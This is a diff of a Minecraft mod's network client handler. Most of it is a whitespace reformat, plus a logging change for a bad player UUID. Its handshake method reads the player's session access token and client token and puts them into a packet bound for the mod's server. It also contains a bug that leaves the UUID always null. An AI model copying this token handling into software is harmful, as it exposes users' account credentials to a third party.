@@ -13,48 +13,48 @@ import java.util.UUID;
 
 public class NetClientHandlerModClient extends NetClientHandler<PacketHandshakeModClient, SessionModClient> {
 
-    private final ModClient modClient;
+	private final ModClient modClient;
 
-    private SessionModClient session;
+	private SessionModClient session;
 
-    public NetClientHandlerModClient(ModClient modClient) {
-        this.modClient = modClient;
-    }
+	public NetClientHandlerModClient(ModClient modClient) {
+		this.modClient = modClient;
+	}
 
-    @Override
-    public SessionModClient newSession(Channel ch) {
-        return new SessionModClient(ch, this, modClient);
-    }
+	@Override
+	public SessionModClient newSession(Channel ch) {
+		return new SessionModClient(ch, this, modClient);
+	}
 
-    @Override
-    public String getName() {
-        return "mod_client";
-    }
+	@Override
+	public String getName() {
+		return "mod_client";
+	}
 
-    @Override
-    public PacketHandshakeModClient getHandshakePacket() {
-        Minecraft mc = Minecraft.getMinecraft();
-        String accessToken = mc.getSession().getToken();
-        String clientToken = ((YggdrasilAuthenticationService) ((YggdrasilMinecraftSessionService) mc
-                .getSessionService()).getAuthenticationService()).getClientToken();
-        String username = mc.getSession().getUsername();
-        UUID uuid = null;
-        try {
-            UUID.fromString(mc.getSession().getPlayerID());
-        } catch (IllegalArgumentException e) {
-            e.printStackTrace();
-        }
-        String version = CraftingDead.MOD_VERSION;
-        return new PacketHandshakeModClient(accessToken, clientToken, username, uuid, version);
-    }
+	@Override
+	public PacketHandshakeModClient getHandshakePacket() {
+		Minecraft mc = Minecraft.getMinecraft();
+		String accessToken = mc.getSession().getToken();
+		String clientToken = ((YggdrasilAuthenticationService) ((YggdrasilMinecraftSessionService) mc
+				.getSessionService()).getAuthenticationService()).getClientToken();
+		String username = mc.getSession().getUsername();
+		UUID uuid = null;
+		try {
+			UUID.fromString(mc.getSession().getPlayerID());
+		} catch (IllegalArgumentException e) {
+			CraftingDead.LOGGER.warn("Bad UUID, could be in offline mode?");
+		}
+		String version = CraftingDead.MOD_VERSION;
+		return new PacketHandshakeModClient(accessToken, clientToken, username, uuid, version);
+	}
 
-    @Override
-    protected void registerPackets() {
-        this.registerPacket(0, PacketNews.class, new PacketNews.PacketHandlerPacketNews());
-    }
+	@Override
+	protected void registerPackets() {
+		this.registerPacket(0, PacketNews.class, new PacketNews.PacketHandlerPacketNews());
+	}
 
-    public SessionModClient getSession() {
-        return this.session;
-    }
+	public SessionModClient getSession() {
+		return this.session;
+	}
 
 }
